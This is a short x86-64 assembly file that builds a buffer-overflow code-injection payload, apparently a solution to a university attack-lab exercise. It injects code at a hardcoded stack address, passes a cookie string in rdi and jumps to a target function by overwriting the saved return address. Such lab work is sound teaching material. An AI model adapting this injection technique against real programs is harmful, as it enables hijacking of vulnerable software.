bits 64

section buf start=0h vstart=5561DC78h
buf:
    mov [str_end], byte 0
    mov rdi, str
    push qword 4018FAh
    ret
str: ; TODO: move str to rsp+x
    db '59b997fa'
str_end:
    times 8 db ' '

section ret_addr start=28h vstart=5561DC78h+28h
ret_addr:
    dq buf